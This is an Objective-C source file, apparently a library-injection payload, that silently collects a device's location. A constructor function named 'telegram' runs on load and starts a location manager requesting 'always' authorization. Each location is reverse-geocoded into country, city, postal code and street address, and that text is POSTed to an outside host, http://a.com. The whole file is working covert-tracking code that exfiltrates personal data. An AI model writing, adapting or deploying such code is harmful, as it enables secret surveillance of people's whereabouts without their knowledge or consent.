#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationFetcher : NSObject <CLLocationManagerDelegate>

@property (strong, nonatomic) CLLocationManager *locationManager;
@property (strong, nonatomic) CLGeocoder *geocoder;

- (void)startFetchingLocation;
- (void)stopFetchingLocation;

@end

@implementation LocationFetcher

- (instancetype)init {
    self = [super init];
    if (self) {
        _locationManager = [[CLLocationManager alloc] init];
        _locationManager.delegate = self;
        _geocoder = [[CLGeocoder alloc] init];
        [_locationManager requestAlwaysAuthorization];
    }
    return self;
}

- (void)startFetchingLocation {
    [self.locationManager startUpdatingLocation];
    NSLog(@"Location fetching started");
}

- (void)stopFetchingLocation {
    [self.locationManager stopUpdatingLocation];
    NSLog(@"Location fetching stopped");
}

#pragma mark - CLLocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager
     didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *latestLocation = [locations lastObject];
    NSLog(@"Received Location: Latitude: %f, Longitude: %f", latestLocation.coordinate.latitude, latestLocation.coordinate.longitude);

    // Reverse geocode to fetch detailed address
    [self.geocoder reverseGeocodeLocation:latestLocation completionHandler:^(NSArray<CLPlacemark *> * _Nullable placemarks, NSError * _Nullable error) {
        if (error) {
            NSLog(@"Geocoding failed: %@", error);
            return;
        }

        if (placemarks && placemarks.count > 0) {
            CLPlacemark *placemark = [placemarks lastObject];
            NSString *locationDetails = [NSString stringWithFormat:@"Country: %@, City: %@, Postal Code: %@, Locality: %@, Address: %@", placemark.country, placemark.locality, placemark.postalCode, placemark.subLocality, placemark.name];
            NSLog(@"%@", locationDetails);

            // Sending the Data as a POST request
            NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
[request setURL:[NSURL URLWithString:@"http://a.com"]];
            [request setHTTPMethod:@"POST"];
            [request setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
            [request setHTTPBody:[locationDetails dataUsingEncoding:NSUTF8StringEncoding]];

            NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                if (error) {
                    NSLog(@"Error sending data: %@", error);
                } else {
                    NSLog(@"Data sent successfully.");
                }
            }];

            [task resume];
        }
    }];
}

- (void)locationManager:(CLLocationManager *)manager
       didFailWithError:(NSError *)error {
    NSLog(@"Location fetching failed: %@", [error localizedDescription]);
}

@end

__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    LocationFetcher *locationFetcher = [[LocationFetcher alloc] init];

    [locationFetcher startFetchingLocation];
[NSThread sleepForTimeInterval:.0];
    [locationFetcher stopFetchingLocation];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
